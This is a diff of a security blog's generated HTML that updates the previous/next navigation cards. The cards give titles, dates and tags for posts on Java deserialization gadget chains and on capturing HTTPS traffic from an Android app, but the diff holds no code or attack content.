-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2024/04/19/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80-cc1-cc6%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
@@ -574,9 +583,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2024-04-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-04-19
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -589,6 +598,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -611,13 +621,13 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/03/26/CommonsCollections1%E9%93%BE%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/">
+                <a href="/2024/04/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84APP%E6%8A%93https%E5%8C%85/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="CommonsCollections1链手写利用">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="记一次艰难的APP抓https包">
                         
-                        <span class="card-title">CommonsCollections1链手写利用</span>
+                        <span class="card-title">记一次艰难的APP抓https包</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -628,14 +638,14 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-04-10
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
-                                    Java安全
+                            <a href="/categories/APP%E6%B8%97%E9%80%8F/" class="post-category">
+                                    APP渗透
                                 </a>
                             
                             
@@ -645,12 +655,12 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Java%E5%AE%89%E5%85%A8/">
-                        <span class="chip bg-color">Java安全</span>
+                    <a href="/tags/Android%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">Android渗透</span>
                     </a>
                     
-                    <a href="/tags/%E4%BB%A3%E7%A0%81/">
-                        <span class="chip bg-color">代码</span>
+                    <a href="/tags/%E6%8A%93%E5%8C%85/">
+                        <span class="chip bg-color">抓包</span>
                     </a>
                     
                 </div>
